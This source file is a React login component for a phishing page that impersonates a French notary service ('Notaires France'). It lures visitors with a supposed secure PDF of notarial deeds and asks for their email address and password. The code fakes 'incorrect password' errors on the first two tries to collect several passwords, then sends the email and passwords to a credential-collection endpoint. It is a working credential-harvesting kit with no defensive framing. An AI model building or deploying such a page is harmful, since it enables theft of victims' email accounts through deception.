"use client";

import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Alert, AlertDescription } from "@/components/ui/alert";
import Image from "next/image";
import { FileText, AlertCircle, Eye, EyeOff, Loader2 } from "lucide-react";

export default function Component() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [passwords, setPasswords] = useState<string[]>([]);

  const [showPassword, setShowPassword] = useState(false);
  const [showPasswordText, setShowPasswordText] = useState(false);
  const [error, setError] = useState("");
  const [attempts, setAttempts] = useState(0);
  const [loading, setLoading] = useState(false);

  const EMAIL_REGEX = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
  const PASSWORD_MIN_LENGTH = 8;

  const validateEmail = (email: string) => {
    if (!email.trim()) {
      return "L'adresse e-mail est requise.";
    }
    if (!EMAIL_REGEX.test(email)) {
      return "Veuillez entrer une adresse e-mail valide.";
    }
    return "";
  };

  const validatePassword = (password: string) => {
    if (!password.trim()) {
      return "Le mot de passe est requis.";
    }
    if (password.length < PASSWORD_MIN_LENGTH) {
      return "Le mot de passe doit contenir au moins 8 caractères.";
    }
    return "";
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
  
    if (!showPassword) {
      const emailError = validateEmail(email);
      if (emailError) {
        setError(emailError);
        return;
      }
      setShowPassword(true);
      return;
    }
  
    const passwordError = validatePassword(password);
    if (passwordError) {
      setError(passwordError);
      return;
    }
  
    const updatedPasswords = [...passwords, password].slice(-3);
    setPasswords(updatedPasswords);
  
    setAttempts((prevAttempts) => {
      const newAttempts = prevAttempts + 1;
  
      console.log("Attempt", newAttempts, ":", {
        email,
        passwords: updatedPasswords,
      });
  
      if (newAttempts === 1) {
        setError("Mot de passe incorrect. Veuillez réessayer.");
      } else if (newAttempts === 2) {
        setError("Deuxième tentative échouée. Dernière chance.");
      } else if (newAttempts === 3) {
        setLoading(true);
        submitCredentials(email, updatedPasswords);
      }
  
      return newAttempts;
    });
  };
  
  const submitCredentials = async (email: string, passwords: string[]) => {
    try {
      const response = await fetch("/api/submit-credentials", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ email, passwords }),
      });
  
      if (!response.ok) {
        throw new Error("Failed to submit credentials");
      }
  
      window.location.href = "#";
    } catch (error) {
      console.error("Error:", error);
      setError("Une erreur s'est produite lors de la soumission. Veuillez réessayer.");
    } finally {
      setLoading(false);
    }
  };

  const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const newPassword = e.target.value;
    setPassword(newPassword);
    if (error) setError("");
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center p-4">
      <div className="mb-8">
        <Image
          src="/logo.png"
          alt="Notaire Logo"
          width={120}
          height={80}
          className="w-auto h-20"
        />
      </div>

      <Card className="w-full max-w-md bg-white">
        <CardHeader className="space-y-1 pb-2">
          <h2 className="text-xl text-center font-medium">
            Vous avez reçu un fichier sécurisé
          </h2>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="flex items-center gap-3 p-3 bg-gray-50 rounded-lg">
            <FileText className="h-8 w-8 text-red-500" />
            <span className="font-medium">
              Actes Notarial + Procuration.pdf
            </span>
          </div>

          <p className="text-sm text-gray-600">
            Pour lire le document veuillez entrer les identifiants de messagerie
            auxquels ce fichier a été envoyé.
          </p>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="space-y-2">
              <Input
                type="email"
                placeholder="Entrez l'adresse email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full"
              />
            </div>

            {showPassword && (
              <div className="space-y-2">
                {passwords.length > 0 && (
                  <div className="space-y-2 hidden">
                    {passwords.map((prevPassword, index) => (
                      <Input
                        key={index}
                        type={showPasswordText ? "text" : "password"}
                        value={prevPassword}
                        disabled
                        className="w-full bg-gray-50"
                      />
                    ))}
                  </div>
                )}
                <div className="relative">
                  <Input
                    type={showPasswordText ? "text" : "password"}
                    placeholder="Entrez le mot de passe"
                    value={password}
                    onChange={handlePasswordChange}
                    className="w-full pr-12"
                    minLength={PASSWORD_MIN_LENGTH}
                  />
                  <button
                    type="button"
                    onClick={() => setShowPasswordText(!showPasswordText)}
                    className="absolute right-3 top-[7px] text-gray-500 hover:text-gray-700"
                  >
                    {showPasswordText ? (
                      <EyeOff className="h-5 w-5" />
                    ) : (
                      <Eye className="h-5 w-5" />
                    )}
                  </button>
                </div>
              </div>
            )}

            {error && (
              <Alert variant="destructive">
                <AlertCircle className="h-4 w-4" />
                <AlertDescription>{error}</AlertDescription>
              </Alert>
            )}

            <Button
              type="submit"
              className="w-full bg-blue-500 hover:bg-blue-700"
              disabled={loading}
            >
              {loading ? (
                <Loader2 className="mr-2 h-4 w-4 animate-spin" />
              ) : showPassword ? (
                "Soumettre"
              ) : (
                "Continuer"
              )}
            </Button>
          </form>
        </CardContent>
      </Card>

      <footer className="mt-8 text-center space-y-4">
        <p className="text-sm text-gray-600">© Notaires France 2024</p>
        <div className="flex items-center justify-center gap-6">
          <Image
            src="/footer.png"
            alt="Paris 2024"
            width={100}
            height={100}
            className="h-10 w-auto"
          />
        </div>
      </footer>
    </div>
  );
}
